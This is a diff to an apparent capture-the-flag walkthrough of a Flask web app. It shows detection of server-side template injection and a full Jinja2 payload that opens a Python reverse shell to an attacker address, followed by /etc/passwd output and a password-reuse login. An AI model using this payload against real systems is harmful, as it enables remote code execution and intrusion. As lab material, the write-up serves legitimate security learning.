@@ -112,7 +112,7 @@
 
 9. I tested various approaches with the message posting functionality including [Server Side Template Injection (SSTI) with Flask](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---basic-injection) since Wappalyzer informed me the web framework was Flask. I then decided to check `/archive` after creating a post. Creating a post with a title and content of `{{7*'7'}}` produces `7777777`, which shows this page is vulnerable to SSTI.
 
-10. Post the following in the title and content using the "New Message" function to get a reverse shell:
+10. Post the following in the title and content using the "New Message" function then visit `/archive` to get a reverse shell:
 
     ```
     {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.131\",3254));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
@@ -171,7 +171,6 @@
     shaun:x:1002:1002:shaun,,,:/home/shaun:/bin/bash
     splunk:x:1003:1003:Splunk Server:/opt/splunkforwarder:/bin/bash
     web:x:1001:1001:,,,:/home/web:/bin/bash
-
     ```
 
     Trying `Guitar123` as the password for `shuan` works: `su shaun`.
